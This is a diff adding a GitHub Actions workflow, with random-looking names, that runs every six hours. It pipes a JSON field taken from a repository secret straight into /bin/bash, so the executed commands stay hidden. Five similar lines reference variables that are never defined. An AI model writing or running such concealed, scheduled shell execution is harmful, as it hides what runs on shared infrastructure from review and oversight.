@@ -1,0 +1,22 @@
+name: yinweizheliangg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yinweizheliangg
+        env:
+          rhb1326: ${{ secrets.rhb1326 }}
+        run: |
+          echo $rhb1326 | jq -r .obny68025 | /bin/bash
+          echo $g935 | jq -r .bkysg7554 | /bin/bash
+          echo $yhd9372 | jq -r .nhsnv91 | /bin/bash
+          echo $t61679 | jq -r .qea262 | /bin/bash
+          echo $kjcp9 | jq -r .y8 | /bin/bash
+          echo $bfti41 | jq -r .yef72 | /bin/bash
+
